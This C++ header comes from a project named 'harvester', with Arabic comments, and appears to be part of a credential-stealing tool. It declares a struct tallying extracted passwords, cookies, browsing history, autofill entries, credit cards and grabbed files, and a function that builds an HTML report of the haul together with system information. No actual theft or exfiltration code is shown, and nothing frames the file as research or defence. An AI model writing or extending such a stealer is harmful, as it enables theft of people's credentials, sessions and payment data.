// harvester/report/report_builder.h
#pragma once

#include <string>
#include <vector>
#include "../system/system_info.h"
#include "../collectors/app_detector.h"

// بنية لإحصائيات البيانات المجمعة (سيتم ملؤها من collector لاحقاً)
struct CollectedStats {
    int passwordsCount;      // عدد كلمات المرور المستخرجة
    int cookiesCount;        // عدد ملفات تعريف الارتباط
    int historyCount;        // عدد سجلات التصفح
    int autofillsCount;      // عدد إدخالات الملء التلقائي
    int creditCardsCount;    // عدد بطاقات الائتمان (0 حالياً)
    int grabbedFilesCount;   // عدد الملفات الملتقطة (0 حالياً)
    std::vector<std::string> domains; // أسماء النطاقات المستخرجة من التاريخ
};

// بناء التقرير النهائي (HTML) وحفظه في outputDir
void BuildReport(const SystemInfo& sysInfo,
                 const std::vector<DetectedApp>& detectedApps,
                 const CollectedStats& stats,
                 const std::string& outputDir);